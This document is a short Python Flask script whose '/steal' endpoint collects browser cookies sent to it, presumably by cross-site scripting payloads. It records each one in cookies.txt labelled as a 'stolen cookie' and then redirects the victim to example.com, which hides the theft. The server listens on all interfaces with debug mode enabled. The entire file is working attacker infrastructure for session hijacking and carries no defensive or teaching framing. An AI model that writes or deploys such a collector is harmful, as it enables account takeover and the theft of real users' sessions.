from flask import Flask, request, redirect
from datetime import datetime

app = Flask(__name__)

@app.route('/steal')
def steal_cookie():
    cookie = request.args.get('cookie')
    print(f"Received cookie: {cookie}")  # Debug log
    if cookie:
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        try:
            with open('cookies.txt', 'a') as f:
                f.write(f"[{timestamp}] Stolen cookie: {cookie}\n")
                print(f"Saved cookie: {cookie}")  # Debug log
        except Exception as e:
            print(f"Error writing to file: {e}")  # Debug log
    return redirect('http://example.com')

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000, debug=True)  # Enable debug mode